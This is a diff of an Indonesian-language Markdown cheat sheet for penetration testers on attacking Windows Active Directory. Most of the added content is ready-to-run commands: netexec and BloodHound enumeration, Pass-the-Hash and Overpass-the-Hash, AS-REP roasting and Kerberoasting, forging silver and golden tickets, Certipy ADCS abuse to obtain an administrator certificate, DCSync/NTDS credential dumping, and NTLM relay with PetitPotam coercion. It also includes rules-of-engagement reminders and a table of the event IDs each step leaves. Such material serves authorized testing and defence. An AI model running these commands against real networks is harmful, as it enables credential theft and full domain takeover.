@@ -1,60 +1,128 @@
 ---
-name: "Advanced Windows Attacks — PtH, DCSync & Kerberos"
-description: "Windows exploitation techniques for CPENT including Pass-the-Hash, Overpass-the-Hash, DCSync, Kerberos attacks (AS-REP, Kerberoasting, Silver/Golden Ticket), SMB relay, and advanced AD enumeration with Impacket and PowerView."
-tags: [windows, pass-the-hash, dcsync, kerberos, impacket, active-directory]
+name: "Windows & Active Directory Attacks — PtH, Kerberos, ADCS"
+description: "Jalur serangan Windows dan Active Directory untuk operator berpengalaman: enumerasi domain, Pass-the-Hash dan Overpass-the-Hash, Kerberos (AS-REP, Kerberoast, silver/golden ticket), delegasi, ADCS, DCSync, SMB relay, dan catatan deteksi untuk tiap langkah."
+tags: [windows, active-directory, pass-the-hash, kerberos, dcsync, adcs, smb-relay, detection]
 ---
 
-# Advanced Windows Attacks
+# Windows & Active Directory Attacks
 
-## Enumeration Framework
+AD jarang direbut dalam satu langkah. Yang khas adalah rantai: kredensial kecil → hak delegasi → jalur yang BloodHound tunjukkan → domain controller. Nilai operator terletak pada memilih jalur terpendek yang tidak memicu deteksi.
+
+## 1. Enumerasi domain
 
 ```powershell
 net view /domain
 nltest /dclist:$DOMAIN
 nltest /domain_trusts
-net view \\$DC /all
-accesschk.exe /accepteula -uwcqv "Authenticated Users" *
-Get-Process | Where-Object { $_.SessionId -ne 0 }
+net group "Domain Admins" /domain
+net group "Enterprise Admins" /domain
+Get-ADUser -Filter * -Properties ServicePrincipalNames | ? {$_.ServicePrincipalNames}
+Get-ADComputer -Filter * | Select Name,DNSHostName,OperatingSystem
 Get-WmiObject -Class Win32_Share
+accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 ```
 
-## Attack Vectors
+Dari Linux, `netexec` (nxc) memberi cakupan lebih luas dan lebih cepat:
 
-**Pass-the-Hash (PtH):**
 ```bash
-impacket-wmiexec DOMAIN/USER@TARGET -hashes LMHASH:NTHASH
+nxc smb 10.10.10.0/24 -u user -p pass --shares --sessions --loggedon-users
+nxc ldap $DC -u user -p pass --users --groups --trusted-for-delegation
+bloodhound-python -d DOMAIN -u user -p pass -dc $DC -c All
 ```
 
-**Overpass-the-Hash**: Konversi NTLM hash ke TGT Kerberos.
+## 2. Kredensial tanpa password
 
-**DCSync:**
+**Pass-the-Hash** — NTLM hash cukup untuk autentikasi:
+
+```bash
+impacket-wmiexec DOMAIN/USER@TARGET -hashes :NTHASH
+nxc smb TARGET -u USER -H NTHASH -x whoami
+```
+
+**Overpass-the-Hash** — konversi hash NTLM ke TGT Kerberos, lalu pakai tiket:
+
+```bash
+impacket-getTGT DOMAIN/USER -hashes :NTHASH
+export KRB5CCNAME=USER.ccache
+impacket-psexec -k -no-pass DOMAIN/USER@TARGET
+```
+
+## 3. Kerberos
+
+```bash
+# AS-REP roasting — akun tanpa pre-auth
+impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -format hashcat
+
+# Kerberoasting — SPN milik user
+impacket-GetUserSPNs DOMAIN/USER:PASS -request -outputfile spn.txt
+
+# Silver ticket — hash akun mesin/layanan
+impacket-ticketer -nthash MACHINE_HASH -domain-sid $SID -domain DOMAIN -spn cifs/TARGET Administrator
+
+# Golden ticket — hash krbtgt
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid $SID -domain DOMAIN Administrator
+```
+
+Pecahkan dengan hashcat mode 13100 (Kerberoast) atau 18200 (AS-REP).
+
+## 4. Delegasi dan ADCS
+
+| Jenis | Ciri | Arah serang |
+|---|---|---|
+| Unconstrained | `TRUSTED_FOR_DELEGATION` | Coerce auth ke host itu, ambil TGT |
+| Constrained | `msDS-AllowedToDelegateTo` | S4U2Self + S4U2Proxy |
+| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Tulis atribut di computer object |
+
+ADCS paling sering disalahkonfigurasi. Certipy mengenumerasi dan mengeksploitasi ESC1–ESC8:
+
+```bash
+certipy find -u user@domain -p pass -dc-ip $DC -vulnerable
+certipy req -u user@domain -p pass -ca CA -template VulnTemplate -upn administrator@domain
+certipy auth -pfx administrator.pfx -dc-ip $DC
+```
+
+## 5. DCSync dan dump
+
 ```bash
 impacket-secretsdump DOMAIN/USER:PASS@$DC
+nxc smb $DC -u USER -p PASS --ntds
 ```
 
-**Kerberos Attacks:**
+DCSync butuh hak replikasi (`DS-Replication-Get-Changes-All`). Ini langkah berdampak tinggi: pastikan ada izin di RoE, ambil hanya yang dibutuhkan, dan jangan menyimpan dump di host target.
+
+## 6. SMB relay dan coercion
+
+Relay berhasil ketika SMB signing tidak wajib dan kredensial bisa dipaksa lewat jaringan:
+
 ```bash
-# AS-REP Roasting
-impacket-GetNPUsers DOMAIN/USER:PASS -request
+# Cek signing
+nxc smb 10.10.10.0/24 --gen-relay-list relay.txt
 
-# Kerberoasting
-impacket-GetUserSPNs DOMAIN/USER:PASS -request
+# Relay ke target tanpa signing
+impacket-ntlmrelayx -tf relay.txt -smb2support -socks
 
-# Silver Ticket
-impacket-ticketer -nthash $HASH -domain-sid $SID -domain DOMAIN -spn cifs/TARGET Administrator
-
-# Golden Ticket
-impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $SID -domain DOMAIN Administrator
+# Coercion (butuh patch level tertentu)
+impacket-PetitPotam.py $ATTACKER $TARGET
 ```
 
-**SMB Relay:**
-```bash
-impacket-ntlmrelayx -tf targets.txt -smb2support
-```
+Relay ke LDAP bisa membuat computer account dan langsung ke RBCD — salah satu rantai tercepat menuju DA.
 
-## Best Practices
+## 7. Deteksi yang ditinggalkan
 
-- CPENT AD attacks tidak berbeda jauh dari OSCP tapi skalanya lebih besar
-- Multiple domain dan forest trust adalah skenario umum
-- Prioritaskan BloodHound untuk mapping attack paths
-- DCSync adalah end-game untuk domain dominance
+| Aksi | Telemetri umum |
+|---|---|
+| Logon jaringan | 4624 tipe 3, 4768/4769 |
+| Kerberoast | 4769 dengan enkripsi RC4 mencurigakan |
+| DCSync | 4662 pada GUID replikasi |
+| ADCS abuse | 4886/4887, penerbitan sertifikat |
+| Relay | 4624 tipe 3 beruntun dari host relay |
+
+Catat telemetri ini di laporan sebagai bagian dari dampak: klien perlu tahu apa yang bisa terdeteksi dan apa yang tidak.
+
+## 8. Best Practices
+
+- BloodHound dulu, eksploitasi kemudian — jalur terpendek biasanya bukan jalur yang paling terlihat.
+- Simpan tiket dan hash di workspace terpisah, bukan di host target.
+- DCSync dan golden ticket adalah langkah terakhir, dengan izin tertulis.
+- Bersihkan objek yang dibuat (computer account, RBCD) sebelum meninggalkan engagement.
+- Laporkan setiap langkah beserta bukti dan waktu, bukan hanya hasil akhir.
